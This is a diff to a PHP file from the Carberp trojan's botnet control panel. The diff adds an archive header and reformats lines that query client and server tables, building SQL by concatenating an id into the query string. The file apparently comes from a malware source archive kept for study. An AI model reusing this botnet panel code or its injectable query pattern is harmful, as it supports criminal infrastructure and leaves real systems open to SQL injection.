@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -12,9 +23,11 @@ function domains_build($row){
 	$servers[$row->server_id]->domains[$row->id] = $row;
 }
 
-if(!empty($Cur['id'])){	$client = $mysqli->query('select * from bf_clients where (id = \''.$Cur['id'].'\')');
+if(!empty($Cur['id'])){
+	$client = $mysqli->query('select * from bf_clients where (id = \''.$Cur['id'].'\')');
 
-	if($client->id == $Cur['id']){		$smarty->assign("client", $client);
+	if($client->id == $Cur['id']){
+		$smarty->assign("client", $client);
 
 		$servers = array();
 		$mysqli->query('select * from bf_servers where (client_id = \''.$client->id.'\')', null, 'servers_build');
